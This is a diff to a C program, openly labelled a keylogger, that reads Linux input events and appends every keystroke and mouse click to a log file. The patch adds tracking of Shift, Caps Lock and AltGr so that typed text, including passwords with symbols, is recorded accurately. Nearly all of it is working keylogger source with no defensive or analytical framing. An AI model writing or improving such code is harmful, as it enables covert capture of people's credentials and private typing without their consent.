@@ -170,6 +170,11 @@ const char* keycode_to_char(int keycode) {
 }
 
 int main() {
+    // Modifier key states
+    int shift_pressed = 0;
+    int caps_lock_on = 0;
+    int alt_gr_pressed = 0;  // For international layouts
+    
     // Find input devices
     int fd;
     char device_path[256];
@@ -267,7 +272,7 @@ int main() {
         return 1;
     }
     
-    char start_msg[128];
+    char start_msg[256];
     strcpy(start_msg, "\n=== Keylogger started at ");
     strcat(start_msg, timestamp_str);
     strcat(start_msg, " ===\n");
@@ -311,27 +316,114 @@ int main() {
                     break;
                 }
                 
-                if (ev.type == EV_KEY && ev.value == 1) { // Key press event
+                if (ev.type == EV_KEY) { // Key event (press or release)
                     key_char = keycode_to_char(ev.code);
-                    
-                    int log_fd_evt = open(log_filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
-                    if (log_fd_evt != -1) {
-                        if (ev.code == KEY_ENTER) {
-                            write(log_fd_evt, "\n", 1);
-                        } else if (ev.code == BTN_LEFT || ev.code == BTN_RIGHT || ev.code == BTN_MIDDLE ||
-                                   ev.code == BTN_SIDE || ev.code == BTN_EXTRA) {
-                            // Mouse button pressed - create new lines
-                            char mouse_msg[128];
-                            strcpy(mouse_msg, "\n");
-                            strcat(mouse_msg, key_char);
-                            strcat(mouse_msg, "\n");
-                            int mouse_len = strlen(mouse_msg);
-                            write(log_fd_evt, mouse_msg, mouse_len);
-                        } else {
-                            int key_len = strlen(key_char);
-                            write(log_fd_evt, key_char, key_len);
+
+                    // Handle modifier key events (press and release)
+                    if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
+                        if (ev.value == 1) {  // Key pressed
+                            shift_pressed = 1;
+                        } else if (ev.value == 0) {  // Key released
+                            shift_pressed = 0;
                         }
-                        close(log_fd_evt);
+                    } else if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
+                        caps_lock_on = !caps_lock_on;  // Toggle caps lock on press
+                    } else if (ev.code == KEY_RIGHTALT) {  // AltGr on many keyboards
+                        if (ev.value == 1) {  // Key pressed
+                            alt_gr_pressed = 1;
+                        } else if (ev.value == 0) {  // Key released
+                            alt_gr_pressed = 0;
+                        }
+                    }
+
+                    // Only process key presses, not releases
+                    if (ev.value == 1) {
+                        int log_fd_evt = open(log_filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
+                        if (log_fd_evt != -1) {
+                            if (ev.code == KEY_ENTER) {
+                                write(log_fd_evt, "\n", 1);
+                            } else if (ev.code == BTN_LEFT || ev.code == BTN_RIGHT || ev.code == BTN_MIDDLE ||
+                                       ev.code == BTN_SIDE || ev.code == BTN_EXTRA) {
+                                // Mouse button pressed - create new lines
+                                char mouse_msg[128];
+                                strcpy(mouse_msg, "\n");
+                                strcat(mouse_msg, key_char);
+                                strcat(mouse_msg, "\n");
+                                int mouse_len = strlen(mouse_msg);
+                                write(log_fd_evt, mouse_msg, mouse_len);
+                            } else {
+                                // Handle character keys with modifiers
+                                char actual_char[16] = {0}; // Buffer for actual character (increased to handle longer strings like [BACKSPACE])
+                                
+                                // Map keycodes to characters considering modifier keys
+                                if (ev.code >= KEY_A && ev.code <= KEY_Z) {
+                                    // Alphabet keys - handle shift and caps lock
+                                    if ((shift_pressed || caps_lock_on) && !alt_gr_pressed) {
+                                        actual_char[0] = 'A' + (ev.code - KEY_A);
+                                    } else if (!alt_gr_pressed) {
+                                        actual_char[0] = 'a' + (ev.code - KEY_A);
+                                    } else {
+                                        // AltGr combinations - use original mapping
+                                        strcpy(actual_char, key_char);
+                                    }
+                                } else if (ev.code >= KEY_1 && ev.code <= KEY_0) {
+                                    // Number keys - handle shift for symbols
+                                    if (shift_pressed && !alt_gr_pressed) {
+                                        // US keyboard layout shift+number mappings
+                                        switch(ev.code) {
+                                            case KEY_1: strcpy(actual_char, "!"); break;
+                                            case KEY_2: strcpy(actual_char, "@"); break;
+                                            case KEY_3: strcpy(actual_char, "#"); break;
+                                            case KEY_4: strcpy(actual_char, "$"); break;
+                                            case KEY_5: strcpy(actual_char, "%"); break;
+                                            case KEY_6: strcpy(actual_char, "^"); break;
+                                            case KEY_7: strcpy(actual_char, "&"); break;
+                                            case KEY_8: strcpy(actual_char, "*"); break;
+                                            case KEY_9: strcpy(actual_char, "("); break;
+                                            case KEY_0: strcpy(actual_char, ")"); break;
+                                            default: actual_char[0] = '0' + (ev.code - KEY_1 + 1) % 10; break;
+                                        }
+                                    } else {
+                                        if (ev.code == KEY_0) {
+                                            actual_char[0] = '0';
+                                        } else {
+                                            actual_char[0] = '0' + (ev.code - KEY_1 + 1);
+                                        }
+                                    }
+                                } else {
+                                    // Handle other keys that might have shift variants
+                                    if (!alt_gr_pressed) {  // Only handle shift, not AltGr combinations
+                                        switch(ev.code) {
+                                            case KEY_MINUS: strcpy(actual_char, shift_pressed ? "_" : "-"); break;
+                                            case KEY_EQUAL: strcpy(actual_char, shift_pressed ? "+" : "="); break;
+                                            case KEY_LEFTBRACE: strcpy(actual_char, shift_pressed ? "{" : "["); break;
+                                            case KEY_RIGHTBRACE: strcpy(actual_char, shift_pressed ? "}" : "]"); break;
+                                            case KEY_BACKSLASH: strcpy(actual_char, shift_pressed ? "|" : "\\"); break;
+                                            case KEY_SEMICOLON: strcpy(actual_char, shift_pressed ? ":" : ";"); break;
+                                            case KEY_APOSTROPHE: strcpy(actual_char, shift_pressed ? "\"" : "'"); break;
+                                            case KEY_GRAVE: strcpy(actual_char, shift_pressed ? "~" : "`"); break;
+                                            case KEY_COMMA: strcpy(actual_char, shift_pressed ? "<" : ","); break;
+                                            case KEY_DOT: strcpy(actual_char, shift_pressed ? ">" : "."); break;
+                                            case KEY_SLASH: strcpy(actual_char, shift_pressed ? "?" : "/"); break;
+                                            case KEY_SPACE: strcpy(actual_char, " "); break;
+                                            case KEY_TAB: strcpy(actual_char, "\t"); break;
+                                            case KEY_BACKSPACE: strcpy(actual_char, "[BACKSPACE]"); break;
+                                            default: 
+                                                // For special keys, use the original mapping
+                                                strcpy(actual_char, key_char);
+                                                break;
+                                        }
+                                    } else {
+                                        // AltGr combinations - use original mapping
+                                        strcpy(actual_char, key_char);
+                                    }
+                                }
+                                
+                                int char_len = strlen(actual_char);
+                                write(log_fd_evt, actual_char, char_len);
+                            }
+                            close(log_fd_evt);
+                        }
                     }
                 }
             }
